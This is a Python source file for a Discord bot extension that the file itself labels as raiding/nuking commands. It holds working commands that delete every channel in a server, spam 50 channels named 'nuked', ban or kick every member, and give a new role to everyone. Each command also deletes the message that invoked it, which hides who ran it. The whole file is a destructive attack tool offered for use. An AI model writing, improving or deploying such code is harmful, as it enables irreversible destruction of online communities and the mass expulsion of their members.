"""
This cog contains raiding/nuking commands. These commands are destructive and can cause irreversible damage to a server. Use them at your own risk.
"""

import discord
from discord.ext import commands
import asyncio

class Raiding(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def nuke(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for i in range(50):
            await ctx.guild.create_text_channel(name="nuked")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def banall(self, ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                pass

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def kickall(self, ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                await member.kick()
            except:
                pass

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def roleall(self, ctx, *, role_name):
        await ctx.message.delete()
        role = await ctx.guild.create_role(name=role_name)
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
            except:
                pass

def setup(bot):
    bot.add_cog(Raiding(bot))
